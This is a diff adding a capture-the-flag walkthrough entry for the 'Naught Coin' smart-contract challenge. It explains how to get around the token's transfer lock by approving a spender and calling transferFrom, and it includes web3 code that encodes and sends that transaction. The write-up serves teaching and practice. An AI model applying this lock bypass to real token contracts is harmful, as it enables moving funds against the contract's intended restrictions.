@@ -289,3 +289,28 @@ contract AttackGatekeeperTwo {
     }
 }
 ```
+
+## 15. Naught Coin
+Just approve another address to take the coins out on behalf of player. Note that you will need to know how to generate the data payload using `web3.eth.encodeFunctionCall`. Once you have the `data` payload, you need to initiate the `web3.eth.sendTransaction` while the selected account on metamask is the spender's account. The reason for this is because `transferFrom()` checks the allowance of msg.sender. 
+```
+web3.eth.abi.encodeFunctionCall({
+    name: 'transferFrom',
+    type: 'function',
+    inputs: [{
+        type: 'address',
+        name: 'sender'
+    },{
+        type: 'address',
+        name: 'recipient'
+    },{
+        type: 'uint256',
+        name: 'amount'
+    }]
+}, ['<insert owner address here>', '<insert spender address here>', '1000000000000000000000000']);
+
+await web3.eth.sendTransaction({
+    to: "insert address of contract instance here",
+    from: "insert address of spender",
+    data: "insert data payload here"
+})
+```
